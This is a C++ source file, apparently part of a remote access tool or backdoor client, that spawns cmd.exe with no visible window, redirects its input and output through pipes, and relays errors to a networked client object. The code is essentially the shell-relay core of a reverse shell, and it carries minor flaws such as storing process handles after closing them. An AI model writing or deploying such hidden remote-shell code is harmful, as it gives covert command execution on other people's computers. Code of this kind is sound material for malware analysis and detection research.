#include "cmdRedirect.h"

CMD::CMD()
{
	saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	saAttr.bInheritHandle = TRUE;
	saAttr.lpSecurityDescriptor = NULL;

	if (!CreatePipe(&g_hChildStd_OUT_Rd, &g_hChildStd_OUT_Wr, &saAttr, 0))
		General::handleError(3, false);
	// Ensure the read handle to the pipe for STDOUT is not inherited.

	if (!SetHandleInformation(g_hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
		General::handleError(3, false);
	// Create a pipe for the child process's STDIN. 

	if (!CreatePipe(&g_hChildStd_IN_Rd, &g_hChildStd_IN_Wr, &saAttr, 0))
		General::handleError(3, false);

	// Ensure the write handle to the pipe for STDIN is not inherited. 

	if (!SetHandleInformation(g_hChildStd_IN_Wr, HANDLE_FLAG_INHERIT, 0))
		General::handleError(3, false);

	createChildProcess();

	cmdptr = this;
}


CMD* CMD::cmdptr = NULL;
bool CMD::cmdOpen = false;
HANDLE CMD::g_hChildProcess = NULL;
HANDLE CMD::g_hChildThread = NULL;

void CMD::cmdThread()
{
	CMD cmd;
	cmdOpen = true;
	while (cmdOpen)
	{
		Sleep(1000);
	}
}

std::string CMD::readCMD()	//read string from stdOut of cmd.exe	//IMPLEMENT AS THREAD
{
	if (cmdOpen)
	{
		DWORD bytesAvailable;
		DWORD bytesRead;
		char buffer[128];
		std::string output;

		do		//loop until bytes are available (until response is processed)
		{
			PeekNamedPipe(g_hChildStd_OUT_Rd, NULL, 0, NULL, &bytesAvailable, NULL);
			Sleep(50);
		} while (bytesAvailable <= 0);

		while (bytesAvailable > 0)		//while there is something to read, read it into buffer and append buffer to string
		{
			ReadFile(g_hChildStd_OUT_Rd, buffer, 127, &bytesRead, NULL);
			buffer[127] = '\0';	//NULL terminator of string
			output += buffer;
			bytesAvailable = bytesAvailable - bytesRead;
			ZeroMemory(buffer, 128);					//clears buffer (else memory leak)
		}
		return output;
	}
	else
		return "CMD is not open";
}

void CMD::writeCMD(std::string command)		//write a string to stdIn of cmd.exe
{
	if (cmdOpen)
	{
		command += '\n';	//apend '\n' to simulate "ENTER"
		if (!WriteFile(g_hChildStd_IN_Wr, command.c_str(), command.size(), NULL, NULL))
			Client::clientptr->SendString("Couldn't write command '" + command + "' to stdIn.");
	}
	else
		Client::clientptr->SendString("Couldn't write to CMD: CMD not open");
}

void CMD::createChildProcess()	//creates child process ||copied from https://msdn.microsoft.com/en-us/library/windows/desktop/ms682499(v=vs.85).aspx ||
{
	PROCESS_INFORMATION piProcInfo;
	STARTUPINFO siStartInfo;
	BOOL bSuccess = FALSE;

	// Set up members of the PROCESS_INFORMATION structure. 

	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	// Set up members of the STARTUPINFO structure. 
	// This structure specifies the STDIN and STDOUT handles for redirection.

	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	siStartInfo.cb = sizeof(STARTUPINFO);
	siStartInfo.hStdError = g_hChildStd_OUT_Wr;
	siStartInfo.hStdOutput = g_hChildStd_OUT_Wr;
	siStartInfo.hStdInput = g_hChildStd_IN_Rd;
	siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

	// Create the child process. 

	bSuccess = CreateProcess(TEXT("C:\\WINDOWS\\system32\\cmd.exe"),
		NULL,     // command line 
		NULL,          // process security attributes 
		NULL,          // primary thread security attributes 
		TRUE,          // handles are inherited 
		CREATE_NO_WINDOW,             // creation flags 
		NULL,          // use parent's environment 
		NULL,          // use parent's current directory 
		&siStartInfo,  // STARTUPINFO pointer 
		&piProcInfo);  // receives PROCESS_INFORMATION 

					   // If an error occurs, exit the application. 
	if (!bSuccess)
		General::handleError(3, false);
	else
	{
		// Close handles to the child process and its primary thread.
		// Some applications might keep these handles to monitor the status
		// of the child process, for example. 
		CloseHandle(piProcInfo.hProcess);
		CloseHandle(piProcInfo.hThread);
	}
	g_hChildProcess = piProcInfo.hProcess;
	g_hChildThread = piProcInfo.hThread;
}